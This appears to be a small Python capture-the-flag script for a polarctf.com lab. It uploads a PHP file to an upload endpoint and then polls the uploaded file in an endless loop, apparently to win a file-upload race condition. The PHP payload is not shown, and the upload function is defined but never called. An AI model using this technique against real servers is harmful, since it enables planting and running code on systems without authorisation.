import requests as req
import time

url = "http://68c02d5f-9003-40a2-8d95-e90a864d766a.www.polarctf.com:8090/uploads/infophtml.php"
url1 = "http://68c02d5f-9003-40a2-8d95-e90a864d766a.www.polarctf.com:8090/upload.php"
filename1 = "infophtml.php"
filename = "flag1.txt"


def upload(url, fileName):
    url = url
    file = {"upfile": open(fileName, 'rb')}  # 这里是上传文件
    response = req.post(url=url, files=file)
    #print(response.text)
def download(url):
    #dist = {'filename':"flag1.txt"}
    response = req.get(url)
    if response.status_code != 404:
        print(response.text)
    else:
        print(404)


while True:
    download(url)
